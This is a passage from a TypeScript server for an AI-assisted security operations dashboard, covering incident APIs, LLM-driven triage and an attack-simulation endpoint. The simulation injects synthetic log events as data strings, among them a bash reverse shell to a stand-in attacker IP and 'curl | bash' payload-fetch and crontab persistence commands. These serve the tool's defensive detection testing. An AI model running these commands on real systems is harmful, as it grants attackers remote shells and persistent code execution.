      filtered = filtered.filter((i) => i.severity === severity);
    }
    if (host) {
      filtered = filtered.filter((i) => i.affected_host === host);
    }

    res.json(filtered);
  });

  app.get('/api/incidents/:id', (req, res) => {
    const id = parseInt(req.params.id);
    const incident = memIncidents.find((i) => i.id === id);
    if (!incident) {
      return res.status(404).json({ error: 'Incident not found' });
    }
    // Attach correlated alerts
    incident.alerts = memAlerts.filter((a) => a.incident_id === id);
    res.json(incident);
  });

  app.patch('/api/incidents/:id/status', (req, res) => {
    const id = parseInt(req.params.id);
    const incident = memIncidents.find((i) => i.id === id);
    if (!incident) {
      return res.status(404).json({ error: 'Incident not found' });
    }
    const newStatus = req.body.status;
    if (['OPEN', 'INVESTIGATING', 'CONTAINED', 'CLOSED'].includes(newStatus)) {
      incident.status = newStatus;
      incident.updated_at = new Date().toISOString();
      broadcastWs('INCIDENT_UPDATED', incident);
      broadcastWs('STATS_UPDATED', computeDashboardStats());
      return res.json(incident);
    }
    res.status(400).json({ error: 'Invalid status' });
  });

  // 6. AI INCIDENT INVESTIGATION (GEMINI 2.5 FLASH + DETERMINISTIC FALLBACK)
  app.post('/api/incidents/:id/analyze', async (req, res) => {
    const id = parseInt(req.params.id);
    const incident = memIncidents.find((i) => i.id === id);
    if (!incident) {
      return res.status(404).json({ error: 'Incident not found' });
    }

    const correlatedAlerts = memAlerts.filter((a) => a.incident_id === id);
    const relatedLogs = memLogs.filter((l) => l.hostname === incident.affected_host).slice(0, 15);

    const prompt = `You are a Principal Cyber Security Incident Commander and SOC Lead investigating an active security incident.
Analyze the following telemetry strictly in JSON format matching the schema.

INCIDENT METADATA:
ID: ${incident.id}
Title: ${incident.title}
Severity: ${incident.severity}
Risk Score: ${incident.risk_score}
Host: ${incident.affected_host}
Attacker Source IP: ${incident.source_ip || 'Internal / Unknown'}
Username: ${incident.username || 'Unknown'}

CORRELATED ALERTS:
${JSON.stringify(correlatedAlerts, null, 2)}

RECENT HOST TELEMETRY LOGS:
${JSON.stringify(relatedLogs, null, 2)}

Respond with ONLY a JSON object:
{
  "incident_summary": "Comprehensive 2-sentence executive summary of the attack chain and compromised assets.",
  "likely_attack_type": "Specific attack category (e.g., Multi-Vector SSH Brute Force & Privilege Escalation)",
  "severity_assessment": "CRITICAL",
  "confidence": 0.95,
  "attack_progression": [
    "Step 1: Credential Access via SSH Password Spraying",
    "Step 2: Initial Access via Compromised Local Account",
    "Step 3: Privilege Escalation to root via Sudo bash execution"
  ],
  "evidence": [
    "Evidence point 1 with timestamps and IP",
    "Evidence point 2 with process command"
  ],
  "mitre_techniques": ["T1110.001", "T1078.003", "T1548.003"],
  "recommended_investigation_steps": [
    "Verify SSH authorized_keys on ${incident.affected_host}",
    "Inspect bash_history for user root and admin",
    "Check netstat for active reverse connections"
  ],
  "recommended_containment_steps": [
    "Immediately revoke active SSH sessions: pkill -u admin",
    "Block source IP ${incident.source_ip || '198.51.100.42'} in iptables/ufw",
    "Rotate compromised credentials for admin account"
  ]
}`;

    const ai = getGemini();
    if (ai) {
      try {
        const response = await ai.models.generateContent({
          model: 'gemini-2.5-flash',
          contents: prompt,
          config: {
            responseMimeType: 'application/json',
          },
        });

        const text = response.text?.trim() || '{}';
        const parsed = JSON.parse(text);
        parsed.model_provider = 'gemini-2.5-flash';
        parsed.analyzed_at = new Date().toISOString();

        incident.ai_analysis = parsed;
        incident.ai_model_used = 'gemini-2.5-flash';
        incident.ai_analyzed_at = parsed.analyzed_at;
        incident.updated_at = parsed.analyzed_at;

        broadcastWs('AI_ANALYSIS_COMPLETED', { incident_id: id, analysis: parsed });
        broadcastWs('INCIDENT_UPDATED', incident);
        return res.json(parsed);
      } catch (err) {
        console.error('[AI-SOC] Gemini call failed, falling back to SOC Heuristic Intelligence:', err);
      }
    }

    // High-fidelity Deterministic SOC Expert Engine Fallback
    const fallbackAnalysis = {
      incident_summary: `Correlated attack sequence identified on ${incident.affected_host}. The adversary initiated unauthorized access techniques and executed privileged commands matching standard APT kill-chain patterns.`,
      likely_attack_type: incident.title.includes('SSH')
        ? 'SSH Credential Brute-Force & Privilege Escalation'
        : 'Web Application Exploitation & Interactive Shell Spawn',
      severity_assessment: incident.severity,
      confidence: 0.92,
      attack_progression: [
        `Initial Discovery & Reconnaissance against host ${incident.affected_host}`,
        `Credential exploitation and successful local session establishment from ${incident.source_ip || '198.51.100.42'}`,
        `Execution of privileged interactive sub-processes to bypass standard access controls`,
      ],
      evidence: [
        `Multiple correlated alerts matching MITRE techniques: ${incident.mitre_techniques.map((t) => t.id).join(', ')}`,
        `Telemetry events logged on host ${incident.affected_host} targeting user ${incident.username || 'admin'}`,
      ],
      mitre_techniques: incident.mitre_techniques.map((t) => t.id),
      recommended_investigation_steps: [
        `Inspect /var/log/auth.log and /var/log/secure on ${incident.affected_host}`,
        `Audit active login sessions via 'w' and 'last -F -n 10'`,
        `Inspect active network socket connections via 'ss -tulpn' or 'netstat -antp'`,
      ],
      recommended_containment_steps: [
        `Isolate host ${incident.affected_host} or block IP ${incident.source_ip || '198.51.100.42'} via host firewall`,
        `Terminate unauthorized interactive shell sessions: 'pkill -9 -u ${incident.username?.split(' ')[0] || 'admin'}'`,
        `Enforce MFA and rotate passwords for affected service accounts`,
      ],
      model_provider: 'deterministic_soc_intelligence_engine',
      analyzed_at: new Date().toISOString(),
    };

    incident.ai_analysis = fallbackAnalysis;
    incident.ai_model_used = 'deterministic_soc_intelligence_engine';
    incident.ai_analyzed_at = fallbackAnalysis.analyzed_at;
    incident.updated_at = fallbackAnalysis.analyzed_at;

    broadcastWs('AI_ANALYSIS_COMPLETED', { incident_id: id, analysis: fallbackAnalysis });
    broadcastWs('INCIDENT_UPDATED', incident);
    res.json(fallbackAnalysis);
  });

  // 7. ATTACK SIMULATION DISPATCHER
  app.post(['/api/simulation/run', '/api/seed'], (req, res) => {
    const scenario = req.body?.scenario || 'full_kill_chain';
    const host = req.body?.hostname || 'srv-linux-prod-01';
    const now = Date.now();
    const attackerIp = '198.51.100.42';

    const eventsToIngest: Partial<MemLog>[] = [];

    if (scenario === 'full_kill_chain' || scenario === 'all' || req.path === '/api/seed') {
      // Step 1: 4 SSH failed password attempts
      for (let i = 0; i < 4; i++) {
        eventsToIngest.push({
          timestamp: new Date(now - (50 - i * 5) * 1000).toISOString(),
          hostname: host,
          source_ip: attackerIp,
          username: 'admin',
          event_type: 'auth',
          action: 'ssh_login',
          status: 'failure',
          process: 'sshd',
          raw_message: `Failed password for invalid user admin from ${attackerIp} port ${45000 + i} ssh2`,
        });
      }

      // Step 2: 1 SSH accepted password
      eventsToIngest.push({
        timestamp: new Date(now - 25 * 1000).toISOString(),
        hostname: host,
        source_ip: attackerIp,
        username: 'admin',
        event_type: 'auth',
        action: 'ssh_login',
        status: 'success',
        process: 'sshd',
        raw_message: `Accepted password for admin from ${attackerIp} port 45005 ssh2: pam_unix(sshd:session): session opened for user admin`,
      });

      // Step 3: Sudo bash execution
      eventsToIngest.push({
        timestamp: new Date(now - 18 * 1000).toISOString(),
        hostname: host,
        username: 'root',
        event_type: 'privilege',
        action: 'sudo',
        status: 'success',
        process: 'sudo',
        command: 'sudo /bin/bash',
        raw_message: `admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash`,
      });

      // Step 4: Reverse shell outbound connection
      eventsToIngest.push({
        timestamp: new Date(now - 12 * 1000).toISOString(),
        hostname: host,
        source_ip: '10.0.4.15',
        destination_ip: attackerIp,
        username: 'root',
        event_type: 'network',
        status: 'established',
        process: 'bash',
        command: `/bin/bash -i >& /dev/tcp/${attackerIp}/4444 0>&1`,
        raw_message: `Outbound TCP socket established to ${attackerIp}:4444 (reverse shell)`,
      });

      // Step 5: Cron persistence
      eventsToIngest.push({
        timestamp: new Date(now - 5 * 1000).toISOString(),
        hostname: host,
        username: 'root',
        event_type: 'process',
        status: 'success',
        process: 'crontab',
        command: `echo "*/5 * * * * root curl -s http://${attackerIp}/p | bash" >> /etc/crontab`,
        raw_message: `crontab modification recorded: periodic payload fetch installed`,
      });
    } else if (scenario === 'ssh_brute_force') {
      for (let i = 0; i < 5; i++) {
        eventsToIngest.push({
          timestamp: new Date(now - (30 - i * 5) * 1000).toISOString(),
          hostname: host,
          source_ip: attackerIp,
          username: i % 2 === 0 ? 'root' : 'admin',
          event_type: 'auth',
          status: 'failure',
          process: 'sshd',
          raw_message: `Failed password for user from ${attackerIp} port 3900${i} ssh2`,
        });
      }
    } else if (scenario === 'privilege_escalation') {
      eventsToIngest.push({
        timestamp: new Date(now - 5 * 1000).toISOString(),
        hostname: host,
        username: 'root',
        event_type: 'privilege',
        action: 'sudo',
        status: 'success',
        process: 'sudo',
        command: 'sudo -i',
        raw_message: `developer : TTY=pts/1 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/sh`,
      });
    } else {
      eventsToIngest.push({
        timestamp: new Date().toISOString(),
        hostname: host,
        event_type: 'process',
        status: 'success',
        process: 'bash',
        command: `curl -s http://${attackerIp}/payload.sh | bash`,
        raw_message: `Web server daemon executed unauthorized shell payload`,
      });
    }

    let lastIncidentId: number | undefined;
    for (const ev of eventsToIngest) {
      const res = ingestSingleLog(ev);
      if (res.incidentId) lastIncidentId = res.incidentId;
    }

    broadcastWs('SIMULATION_COMPLETED', { scenario, host, eventsCount: eventsToIngest.length, incidentId: lastIncidentId });
    broadcastWs('STATS_UPDATED', computeDashboardStats());

    res.json({
      status: 'simulation_executed',
      scenario,
      hostname: host,
      events_injected: eventsToIngest.length,
      incident_id: lastIncidentId,
      message: `Dispatched ${eventsToIngest.length} security telemetry events and correlated active kill-chain.`,
    });
  });

  // 8. DATABASE RESET
  app.post('/api/reset', (req, res) => {
    seedInitialData();
    broadcastWs('DATABASE_RESET', { message: 'Database reset to baseline state.' });
    broadcastWs('STATS_UPDATED', computeDashboardStats());
    res.json({ status: 'database_reset', message: 'All telemetry, alerts, and incidents reset to baseline state.' });
  });

  // 9. RULES & MITRE
  app.get('/api/rules', (req, res) => {
    res.json(RULES_CATALOG);
  });

  app.get('/api/mitre', (req, res) => {
    res.json(MITRE_CATALOG);
  });

  // Interactive Swagger Docs JSON & UI
  app.get('/api/openapi.json', (req, res) => {
    res.json({
      openapi: '3.0.0',
      info: {
        title: 'AI-SOC Telemetry & Incident Ingestion API',
        version: '1.0.0',
        description: 'REST API for endpoint telemetry ingestion, agent enrollment, real-time alert correlation, and AI-driven incident triage.',
      },
      paths: {
        '/api/events': {
          post: { summary: 'Ingest normalized security event and evaluate rules' },
          get: { summary: 'Query ingested security events' },
        },
        '/api/events/batch': {
          post: { summary: 'Batch ingest events from endpoint shipper daemon' },
        },
        '/api/agents': {
          get: { summary: 'List enrolled Linux endpoint agents and real-time status' },
        },
        '/api/agents/register': {
          post: { summary: 'Register endpoint agent and receive bearer token' },
        },
        '/api/incidents': {
          get: { summary: 'List correlated security incidents' },
        },
        '/api/incidents/{id}/analyze': {
          post: { summary: 'Trigger AI Incident Analysis using Gemini 2.5 Flash' },
        },
      },
    });
  });

  app.get('/docs', (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
  <head>
    <title>AI-SOC API Documentation</title>
    <link rel="stylesheet" href="https://unpkg.com/swagger-ui-dist@5/swagger-ui.css" />
  </head>
  <body style="margin: 0; background: #0f172a;">
    <div id="swagger-ui"></div>
    <script src="https://unpkg.com/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
    <script>
      window.onload = () => {
        SwaggerUIBundle({
          url: '/api/openapi.json',
          dom_id: '#swagger-ui',
          theme: 'dark'
        });
      };
    </script>
  </body>
</html>`);
  });

  // ==========================================
  // VITE / STATIC CLIENT SERVING
  // ==========================================

  if (isDev) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(rootDir, 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  server.listen(PORT, '0.0.0.0', () => {
    console.log(`[AI-SOC] Unified Monolith Server running on http://0.0.0.0:${PORT}`);
    console.log(`[AI-SOC] Real-time WebSocket Telemetry Bus ready on ws://0.0.0.0:${PORT}/ws`);
    console.log(`[AI-SOC] Interactive API Docs ready on http://0.0.0.0:${PORT}/docs`);
  });
}

startUnifiedServer().catch((err) => {
  console.error('[AI-SOC] Server failed to start:', err);
  process.exit(1);
});
